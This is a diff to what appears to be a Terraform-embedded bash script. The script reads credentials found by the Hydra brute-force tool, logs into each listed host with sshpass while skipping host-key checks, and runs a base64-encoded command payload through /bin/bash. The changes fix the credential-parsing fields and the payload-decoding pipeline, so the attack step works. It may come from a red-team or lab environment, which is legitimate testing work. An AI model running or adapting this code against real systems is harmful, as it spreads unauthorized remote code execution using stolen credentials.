@@ -109,10 +109,10 @@ locals {
                                                 do
                                                     # Parse Hydra output
                                                     host=$(echo "$line" | awk '{print $3}')
-                                                    username=$(echo "$line" | awk '{print $6}')
-                                                    password=$(echo "$line" | awk '{print $8}')
-                                                    log "Attempting to execute payload: sshpass -p \"$password\" ssh -o StrictHostKeyChecking=no \"$username\"@\"$host\" 'base64 -d ${local.base64_command_payload} | /bin/bash"
-                                                    sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username"@"$host" 'base64 -d ${local.base64_command_payload} | /bin/bash'
+                                                    username=$(echo "$line" | awk '{print $5}')
+                                                    password=$(echo "$line" | awk '{print $7}')
+                                                    log "Attempting to execute payload: sshpass -p \"$password\" ssh -o StrictHostKeyChecking=no \"$username\"@\"$host\" 'echo ${local.base64_command_payload} | base64 -d | /bin/bash"
+                                                    sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username"@"$host" 'echo ${local.base64_command_payload} | base64 -d | /bin/bash'
                                                     log "Done"
                                                 done < <(grep -v "^#" /tmp/hydra-found.txt | sort | uniq)
                                                 log "Done."
